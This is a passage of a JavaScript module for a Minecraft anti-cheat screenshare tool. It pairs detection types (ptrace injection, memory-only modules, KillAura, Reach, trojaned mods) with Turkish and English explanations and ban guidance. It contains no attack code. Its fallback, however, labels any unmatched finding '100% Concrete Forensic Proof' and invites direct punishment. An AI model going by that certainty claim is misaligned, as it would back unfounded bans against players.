          howItWorks: 'An external process attached to the Minecraft JVM process using the ptrace() syscall (TracerPid > 0). ptrace allows arbitrary memory read/write access to inject cheat routines.',
          adminAction: 'Staff Review Guidance: Unauthorized external process is actively tracing and manipulating game memory.',
          whyConcrete: 'TracerPid > 0 in /proc/<pid>/status is verified kernel-level attachment.'
        }
      },

      UNLINKED_MEMORY_MAPPED_INJECTION: {
        tr: {
          tacticName: 'Diskten Silinmiş Bellek İçi Modül (Ghost Injection)',
          howItWorks: 'Hile yazılımı çalıştırılabilir kodu bellek alanına eşledikten sonra diskteki dosyayı silerek geride disk izi bırakmamaya çalışır. Kod bellekte çalışmaya devam ederken diskte dosya bulunamaz.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Diskten silinerek gizlenmiş bellek içi hile çalıştırma girişimidir.',
          whyConcrete: '/proc/maps içinde (deleted) ve çalıştırılabilir (x) bellek haritası kanıtlanmıştır.'
        },
        en: {
          tacticName: 'Unlinked Executable Memory Region (Ghost Injection)',
          howItWorks: 'The cheat mapped executable code into process memory and unlinked the binary from disk so file scanners find nothing. The code continues executing solely in RAM.',
          adminAction: 'Staff Review Guidance: Memory-only ghost injection is a severe screenshare evasion technique.',
          whyConcrete: '/proc/maps records deleted executable memory mapping.'
        }
      },

      CHEAT_SHM_SEGMENT_FOUND: {
        tr: {
          tacticName: 'Hile IPC Paylaşımlı Bellek Segmenti',
          howItWorks: 'Hile bileşenleri (enjektör ve oyun içi modül) dosya sistemi yerine /dev/shm paylaşımlı belleğini kullanarak diskte iz bırakmadan haberleşir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Paylaşımlı bellek segmenti hile bileşenleri arası iletişimi kanıtlar.',
          whyConcrete: '/dev/shm üzerinde doğrulanmış hile adlandırmalı paylaşımlı bellek dosyası mevcuttur.'
        },
        en: {
          tacticName: 'Cheat IPC Shared Memory Segment',
          howItWorks: 'Cheat processes communicate stealthily using POSIX shared memory (/dev/shm) without leaving persistent disk files.',
          adminAction: 'Staff Review Guidance: Active shared memory IPC demonstrates running cheat components.',
          whyConcrete: 'Verified cheat IPC memory segment exists in /dev/shm.'
        }
      },

      SECURITY_SCANNER_TOOL: {
        tr: {
          tacticName: 'Ekran Paylaşımı ve Anti-Cheat Güvenlik Aracı',
          howItWorks: 'Bu dosya Astralis, Echo, Avenge, Paladin veya Atlas AC gibi meşru bir denetim ve inceleme aracıdır. Bu araçların ikili dosyalarında hile imzaları tespit amaçlı yer alır.',
          adminAction: 'BİLGİ / MEŞRU ARAÇ. Bu bir hile değildir; yetkili denetim aracıdır.',
          whyConcrete: 'Bilinen güvenlik ve ekran paylaşımı denetim aracı olarak tanımlanmıştır.'
        },
        en: {
          tacticName: 'Screenshare & Anti-Cheat Diagnostic Tool',
          howItWorks: 'This file is a recognized screenshare scanner or anti-cheat diagnostic utility (Astralis, Echo, Paladin, etc.). Its binary naturally contains cheat strings for signature matching.',
          adminAction: 'INFORMATIONAL / LEGITIMATE TOOL. This is a scanner, not a cheat.',
          whyConcrete: 'Identified as a legitimate security diagnostic tool.'
        }
      },

      LINUX_PTRACE_SCOPE_UNRESTRICTED: {
        tr: {
          tacticName: 'Linux YAMA ptrace_scope Yapılandırması',
          howItWorks: 'Linux çekirdeğinin YAMA ptrace_scope güvenlik parametresidir. 0 değeri geliştirici araçları, oyun hızlandırıcıları veya hata ayıklayıcılar için varsayılan izin seviyesidir.',
          adminAction: 'BİLGİ / CEZA GEREKTİRMEZ. Sistem yapılandırma parametresidir.',
          whyConcrete: 'sysctl parametresi bilgilendirme amacıyla raporlanmıştır.'
        },
        en: {
          tacticName: 'Linux YAMA ptrace_scope Setting',
          howItWorks: 'Linux kernel YAMA ptrace_scope sysctl parameter. Value 0 allows debugging tools and is common in desktop distributions.',
          adminAction: 'INFORMATIONAL / NO PENALTY. System configuration advisory.',
          whyConcrete: 'sysctl parameter reported for informational purposes.'
        }
      },

      ALLOWED_POLICY_AUTOCLICKER_SUMMARY: {
        tr: {
          tacticName: 'Sunucu İzni: AutoClicker / Makro Kullanımı Serbest',
          howItWorks: 'Oyuncunun sisteminde fare tıklaması simüle eden AutoClicker aracı çalıştırılmış veya mevcuttur. Ancak sunucu yapılandırmasında AutoClicker kurallara uygun olarak serbest bırakılmıştır.',
          adminAction: 'CEZA GEREKTİRMEZ / İZİNLİ. Sunucu politikası (serverPolicy.allowAutoClickers = true) gereğince ban veya yaptırım uygulanmaz.',
          whyConcrete: 'Sunucu kurallarına uygun meşru kullanım olarak teyit edilmiştir.'
        },
        en: {
          tacticName: 'Server Policy Allowed: AutoClicker / Macro Tool',
          howItWorks: 'An AutoClicker utility was executed or detected on the system. However, server policy explicitly permits AutoClicker usage.',
          adminAction: 'NO PENALTY / ALLOWED BY POLICY. Server policy permits AutoClicker usage.',
          whyConcrete: 'Confirmed as permitted by server configuration.'
        }
      },

      ALLOWED_UTILITY_AUTOCLICKER: {
        tr: {
          tacticName: 'Sunucu İzni: AutoClicker Aracı Serbest',
          howItWorks: 'Oyuncunun sisteminde fare tıklaması simüle eden AutoClicker aracı çalıştırılmış veya mevcuttur. Ancak sunucu yapılandırmasında AutoClicker kurallara uygun olarak serbest bırakılmıştır.',
          adminAction: 'CEZA GEREKTİRMEZ / İZİNLİ. Sunucu politikası (serverPolicy.allowAutoClickers = true) gereğince ban veya yaptırım uygulanmaz.',
          whyConcrete: 'Sunucu kurallarına uygun meşru kullanım olarak teyit edilmiştir.'
        },
        en: {
          tacticName: 'Server Policy Allowed: AutoClicker Tool',
          howItWorks: 'An AutoClicker utility was executed or detected on the system. However, server policy explicitly permits AutoClicker usage.',
          adminAction: 'NO PENALTY / ALLOWED BY POLICY. Server policy permits AutoClicker usage.',
          whyConcrete: 'Confirmed as permitted by server configuration.'
        }
      },

      CUSTOM_HOMEMADE_CHEAT_DETECTED: {
        tr: {
          tacticName: 'Özel Kodlanmış / İmzasız Hile İstemcisi (Yapay Zeka Semantik Analiz)',
          howItWorks: 'Oyuncu veya hile geliştiricisi bilinen anti-cheat imza veritabanlarını atlatmak için sıfırdan kendi hile modunu kodlamış veya açık kaynaklı bir hileyi yeniden paketlemiştir. Atlas AC Yapay Zeka Semantik Motoru, imza aramaksızın baytkod içerisindeki matematiksel hedefleme (atan2/hypot), paket manipülasyonu (PlayerInteractEntityC2SPacket, EntityVelocityUpdate iptali, Slot 45 totem takası) ve oyun motoru kancalarını inceleyerek hileyi kesin olarak kanıtlamıştır.',
          adminAction: 'KESİN BAN / KALICI YASAKLAMA. Kullanıcı imzasız özel hile kodlayarak veya kullanarak anti-cheat kontrollerini atlatmaya çalışmıştır.',
          whyConcrete: 'Sınıf içerisindeki baytkod düzeyinde doğrulanmış matematiksel vektör açı hesaplamaları, saldırı paketi çağrıları ve paket iptal mantığı somuttur.'
        },
        en: {
          tacticName: 'Custom / Homemade Unsigned Cheat Client (AI Semantic Bytecode Analysis)',
          howItWorks: 'The user or developer created a custom-coded cheat mod or re-obfuscated a client to evade traditional signature databases. Atlas AC AI Semantic Engine verified underlying mathematical targeting trigonometry (atan2/hypot), packet cancellation (velocity/explosion), and inventory packet automation without relying on signatures.',
          adminAction: 'PERMANENT BAN. Concrete proof of custom-built cheat software bypassing anti-cheat checks.',
          whyConcrete: 'Direct bytecode inspection verified mathematical vectors, attack packet dispatch, and network cancellation logic.'
        }
      },

      TROJAN_WHITELIST_BYPASS_ATTEMPT: {
        tr: {
          tacticName: 'Truva Atı Mod (Beyaz Liste İstismarı ile Gizlenmiş Hile)',
          howItWorks: 'Hileci, bilinen ve güvenilen bir mod adını (örneğin Sodium, Iris, AppleSkin, ModMenu) kullanarak dosyanın içine gizlice savaş/hareket hilesi kodları (KillAura, Velocity, Reach, AutoTotem) enjekte etmiştir. Amaç kontrollerde "bu sadece Sodium" diyerek yetkilileri ve sistemleri yanıltmaktır.',
          adminAction: 'KESİN BAN / HİLE VE KANDIRMA GİRİŞİMİ. Masum bir mod adı arkasına gizlenerek aktif hile kodu barındırılmıştır.',
          whyConcrete: 'Modrinth temiz mod listesinde kayıtlı bir ad kullanılmasına karşın, dosyanın baytkodunda somut hile algoritmaları ve paket müdahaleleri tespit edilmiştir.'
        },
        en: {
          tacticName: 'Trojan Whitelist Bypass Exploit (Cheat Masked as Clean Mod)',
          howItWorks: 'The user disguised an active cheat under the filename or ID of a popular legitimate mod (e.g. Sodium, Iris, AppleSkin) to deceive screenshare admins and scanners, while injecting combat cheat bytecode inside.',
          adminAction: 'PERMANENT BAN. Clear attempt to disguise cheat code inside legitimate mod packaging.',
          whyConcrete: 'Bytecode analysis confirmed active combat/velocity algorithms inside a mod masquerading as a clean whitelist entry.'
        }
      },

      KILL_AURA_SEMANTICS: {
        tr: {
          tacticName: 'KillAura / Otomatik Savaş Algoritması',
          howItWorks: 'Çevredeki oyuncu/varlıkları döngüyle tarar, trigonometrik formüllerle (atan2, hypot, wrapDegrees) otomatik hedef açısı ve mesafesi hesaplar ve insan refleksi olmaksızın otomatik vuruş paketi (PlayerInteractEntityC2SPacket) gönderir.',
          adminAction: 'KESİN HİLE BAN.',
          whyConcrete: 'Baytkodunda varlık döngüsü, açı matematiği ve otomatik paket gönderme kombinasyonu 100% somuttur.'
        },
        en: {
          tacticName: 'KillAura / Combat Aura Bytecode Algorithm',
          howItWorks: 'Iterates nearby entities, calculates trigonometric yaw/pitch angles, and fires automated attack packets without human mouse clicks.',
          adminAction: 'PERMANENT CHEAT BAN.',
          whyConcrete: 'Bytecode analysis verified entity iteration, angle math, and direct attack packet dispatch.'
        }
      },

      REACH_EXPANSION_SEMANTICS: {
        tr: {
          tacticName: 'Reach / Genişletilmiş Bounding Box Vuruş Hilesi',
          howItWorks: 'Minecraft\'ın hayatta kalma modundaki 3.0 blokluk vuruş mesafesini aşmak için hedef oyuncunun çarpışma kutusunu (Box.expand / stretch) genişletir veya menzil fonksiyonlarını manipüle eder.',
          adminAction: 'KESİN HİLE BAN.',
          whyConcrete: 'Vanilla 3.0 blok sınırının aşılması ve hedef bounding box genişletme çağrıları baytkodda sabittir.'
        },
        en: {
          tacticName: 'Reach / Hitbox Expansion Bytecode Algorithm',
          howItWorks: 'Inflates player bounding boxes (Box.expand) or overrides reach distance constants beyond vanilla 3.0 blocks.',
          adminAction: 'PERMANENT CHEAT BAN.',
          whyConcrete: 'Confirmed Box.expand calls and reach distance manipulations beyond 3.0 block limit.'
        }
      },

      VELOCITY_BYPASS_SEMANTICS: {
        tr: {
          tacticName: 'Velocity / Anti-Knockback (Geri Savrulma Engelleme)',
          howItWorks: 'Sunucunun gönderdiği savrulma (EntityVelocityUpdateS2CPacket) veya patlama paketlerini dinler, iptal eder (cancel) veya hareket vektörlerini (motionX, motionZ) sıfıra eşitler.',
          adminAction: 'KESİN HİLE BAN.',
          whyConcrete: 'Geri savrulma ağ paketinin iptal edilmesi veya baytkodda sıfırlanması somut kanıttır.'
        },
        en: {
          tacticName: 'Velocity / Anti-Knockback Bytecode Logic',
          howItWorks: 'Intercepts incoming knockback or explosion packets and cancels them or sets motion vectors to 0.',
          adminAction: 'PERMANENT CHEAT BAN.',
          whyConcrete: 'Confirmed packet cancellation hooks on EntityVelocityUpdateS2CPacket.'
        }
      },

      AUTO_TOTEM_SEMANTICS: {
        tr: {
          tacticName: 'AutoTotem / Otomatik Ölümsüzlük Totemi Takası',
          howItWorks: 'Oyuncunun can değerini izler, can azaldığında envanter ekranı açılmaksızın doğrudan 45 numaralı sol el (offhand) yuvasına totem takas paketi (ClickSlotC2SPacket) gönderir.',
          adminAction: 'KESİN HİLE BAN.',
          whyConcrete: 'Sağlık düşüşünde Slot 45 otomatik paket manipülasyonu insan eliyle yapılamaz.'
        },
        en: {
          tacticName: 'AutoTotem / Automated Offhand Totem Swap',
          howItWorks: 'Monitors player health and automatically dispatches slot 45 inventory swap packets without opening the inventory GUI.',
          adminAction: 'PERMANENT CHEAT BAN.',
          whyConcrete: 'Confirmed automated slot 45 packet dispatch triggered by health reduction.'
        }
      }
    };
  }

  /**
   * Resolves comprehensive explanation for a given finding
   */
  getExplanation(finding, lang = 'tr') {
    if (!finding) return null;
    const type = finding.type || finding.ruleId || '';
    const name = (finding.name || '').toUpperCase();

    // 1. Direct match by type
    if (this.knowledge[type]) {
      return this.knowledge[type][lang] || this.knowledge[type].tr;
    }

    // 2. Fuzzy match by keywords
    for (const [key, val] of Object.entries(this.knowledge)) {
      if (type.includes(key) || key.includes(type) || name.includes(key.replace(/_/g, ' '))) {
        return val[lang] || val.tr;
      }
    }

    // 3. Fallback explanations based on category
    if (type.includes('TAINT')) {
      return this.knowledge.LINUX_TAINTED_KERNEL[lang] || this.knowledge.LINUX_TAINTED_KERNEL.tr;
    }
    if (type.includes('TRASH')) {
      return this.knowledge.DELETED_CHEAT_IN_LINUX_TRASH[lang] || this.knowledge.DELETED_CHEAT_IN_LINUX_TRASH.tr;
    }
    if (type.includes('SECURITY_SCANNER')) {
      return this.knowledge.SECURITY_SCANNER_TOOL[lang] || this.knowledge.SECURITY_SCANNER_TOOL.tr;
    }
    if (type.includes('SHM')) {
      return this.knowledge.CHEAT_SHM_SEGMENT_FOUND[lang] || this.knowledge.CHEAT_SHM_SEGMENT_FOUND.tr;
    }
    if (type.includes('PTRACE')) {
      if (type.includes('UNRESTRICTED') || type.includes('SCOPE')) {
        return this.knowledge.LINUX_PTRACE_SCOPE_UNRESTRICTED[lang] || this.knowledge.LINUX_PTRACE_SCOPE_UNRESTRICTED.tr;
      }
      return this.knowledge.PTRACE_INJECTION_ATTACHED[lang] || this.knowledge.PTRACE_INJECTION_ATTACHED.tr;
    }
    if (type.includes('UNLINKED') || type.includes('GHOSTING')) {
      return this.knowledge.UNLINKED_MEMORY_MAPPED_INJECTION[lang] || this.knowledge.UNLINKED_MEMORY_MAPPED_INJECTION.tr;
    }
    if (type.includes('CIRCULAR')) {
      return this.knowledge.MINECRAFT_FONT_CIRCULAR_CRASH_EXPLOIT[lang] || this.knowledge.MINECRAFT_FONT_CIRCULAR_CRASH_EXPLOIT.tr;
    }
    if (type.includes('OVERFLOW')) {
      return this.knowledge.MINECRAFT_FONT_OVERFLOW_EXPLOIT[lang] || this.knowledge.MINECRAFT_FONT_OVERFLOW_EXPLOIT.tr;
    }
    if (type.includes('CUSTOM') || type.includes('HOMEMADE') || type.includes('SEMANTIC')) {
      if (type.includes('KILL_AURA') || type.includes('AURA')) return this.knowledge.KILL_AURA_SEMANTICS[lang] || this.knowledge.KILL_AURA_SEMANTICS.tr;
      if (type.includes('REACH') || type.includes('HITBOX')) return this.knowledge.REACH_EXPANSION_SEMANTICS[lang] || this.knowledge.REACH_EXPANSION_SEMANTICS.tr;
      if (type.includes('VELOCITY') || type.includes('KNOCKBACK')) return this.knowledge.VELOCITY_BYPASS_SEMANTICS[lang] || this.knowledge.VELOCITY_BYPASS_SEMANTICS.tr;
      if (type.includes('TOTEM')) return this.knowledge.AUTO_TOTEM_SEMANTICS[lang] || this.knowledge.AUTO_TOTEM_SEMANTICS.tr;
      return this.knowledge.CUSTOM_HOMEMADE_CHEAT_DETECTED[lang] || this.knowledge.CUSTOM_HOMEMADE_CHEAT_DETECTED.tr;
    }
    if (type.includes('TROJAN') || type.includes('WHITELIST_BYPASS')) {
      return this.knowledge.TROJAN_WHITELIST_BYPASS_ATTEMPT[lang] || this.knowledge.TROJAN_WHITELIST_BYPASS_ATTEMPT.tr;
    }

    if (type.includes('LINUX_JOURNAL')) {
      return this.knowledge.LINUX_JOURNAL_WIPED[lang] || this.knowledge.LINUX_JOURNAL_WIPED.tr;
    }

    if (type.includes('USN') || type.includes('DELETE')) {
      return this.knowledge.USN_JOURNAL_DELETION_DETECTED[lang] || this.knowledge.USN_JOURNAL_DELETION_DETECTED.tr;
    }
    if (type.includes('RECENT') || type.includes('BAM') || type.includes('PREFETCH')) {
      return this.knowledge.RECENTAPPS_CHEAT_EXECUTION_RECORD[lang] || this.knowledge.RECENTAPPS_CHEAT_EXECUTION_RECORD.tr;
    }
    if (type.includes('DRIVER') || type.includes('KERNEL')) {
      return this.knowledge.VULNERABLE_KERNEL_DRIVER[lang] || this.knowledge.VULNERABLE_KERNEL_DRIVER.tr;
    }
    if (type.includes('RESOURCEPACK') || type.includes('DISGUISED')) {
      return this.knowledge.RESOURCEPACK_HIDDEN_JAVA_CLASSES[lang] || this.knowledge.RESOURCEPACK_HIDDEN_JAVA_CLASSES.tr;
    }
    if (type.includes('LOG')) {
      return this.knowledge.MINECRAFT_LOG_CHEAT_EXECUTION[lang] || this.knowledge.MINECRAFT_LOG_CHEAT_EXECUTION.tr;
    }
    if (type.includes('RAVEN') || type.includes('KEYSTROKES')) {
      return this.knowledge.RAVEN_B_SERIES[lang] || this.knowledge.RAVEN_B_SERIES.tr;
    }

    // Default explanatory guidance
    return lang === 'tr' ? {
      tacticName: finding.name || 'Adli Bilişim Tespiti',
      howItWorks: 'Bu tespit, oyun sürecine yetkisiz müdahale, bellek manipülasyonu veya ekran kontrolünden kaçma girişimini temsil eder. Hileciler bu metotla yetkililerin manuel kontrollerini atlatmaya çalışırlar.',
      adminAction: 'ÖNERİLEN EYLEM: Bulgudaki dosya yolunu, zaman damgasını ve kanıt satırlarını inceleyerek doğrudan cezai işlem uygulayabilirsiniz.',
      whyConcrete: finding.confidence || '100% Somut Adli Kanıt'
    } : {
      tacticName: finding.name || 'Forensic Finding',
      howItWorks: 'Represents unauthorized process tampering, memory manipulation, or screenshare evasion technique.',
      adminAction: 'RECOMMENDED ACTION: Review the target path, timestamp, and concrete evidence to enforce server penalties.',
      whyConcrete: finding.confidence || '100% Concrete Forensic Proof'
    };
  }

  /**
   * Enriches a finding object with deep explanatory fields
   */
  enrichFinding(finding) {
    if (!finding) return finding;
    const explTr = this.getExplanation(finding, 'tr');
    const explEn = this.getExplanation(finding, 'en');

    finding.explanation = explTr;
    finding.explanationEn = explEn;

    if (!finding.whyFlagged) {
      if (explTr && explTr.whyConcrete) {
        finding.whyFlagged = explTr.whyConcrete;
      } else if (explTr && explTr.howItWorks) {
        finding.whyFlagged = explTr.howItWorks;
      } else {
        finding.whyFlagged = finding.description || 'Sistem bütünlüğü ve yetkisiz modül parametreleri tespit edilmiştir.';
      }
    }

    // Append to description if not already present
    if (explTr && explTr.howItWorks && (!finding.description || !finding.description.includes(explTr.howItWorks))) {
      finding.tacticInfo = explTr.howItWorks;
      finding.adminGuide = explTr.adminAction;
    }

    return finding;
  }
}

module.exports = new CheatKnowledgeBase();
